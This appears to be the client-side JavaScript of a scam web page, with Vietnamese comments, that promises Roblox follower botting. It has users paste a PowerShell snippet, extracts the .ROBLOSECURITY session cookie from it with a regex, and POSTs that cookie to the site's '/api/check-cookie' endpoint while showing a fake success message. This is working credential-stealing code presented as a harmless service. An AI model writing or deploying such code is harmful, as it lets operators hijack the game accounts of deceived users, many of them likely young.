function startBotting() {
    extractAndCheckCookie();
}

async function extractAndCheckCookie() {
    const inputText = document.getElementById("powershellInput").value;
    const notificationElement = document.getElementById("notification");

    if (!notificationElement) {
        console.error("Không tìm thấy phần tử với ID 'notification'.");
        return;
    }

    // Regex tìm cookie hợp lệ
    const cookieMatch = inputText.match(/New-Object\s+System\.Net\.Cookie\s*\(\s*["']\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/i);

    if (!cookieMatch || cookieMatch.length < 2) {
        showNotification("❌ Invalid User Code", "error");
        return;
    }

    const extractedCookie = cookieMatch[1];
    showNotification("⏳ Đang kiểm tra cookie...", "info");

    try {
        const response = await fetch('/api/check-cookie', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie: extractedCookie }),
        });

        const result = await response.json();

        if (result.success) {
            showNotification("✅ Bot succeeds followers!", "success");
        } else {
            showNotification(`❌ ${result.error}`, "error");
        }
    } catch (error) {
        console.error("Lỗi khi gửi cookie:", error);
    }
}

// Hiển thị thông báo
function showNotification(message, type) {
    const notification = document.getElementById("notification");
    notification.innerHTML = `
        <div class="error-icon">${type === "success" ? "✅" : "❌"}</div>
        <h2>${message}</h2>
        <button class="continue-btn" onclick="closeNotification()">Continue</button>
    `;

    notification.classList.add("show");
    notification.style.display = "block";

    setTimeout(() => {
        closeNotification();
    }, 5000);
}

// Ẩn thông báo
function closeNotification() {
    const notification = document.getElementById("notification");
    notification.classList.remove("show");
    notification.classList.add("hide");

    setTimeout(() => {
        notification.style.display = "none";
        notification.classList.remove("hide");
    }, 500);
}

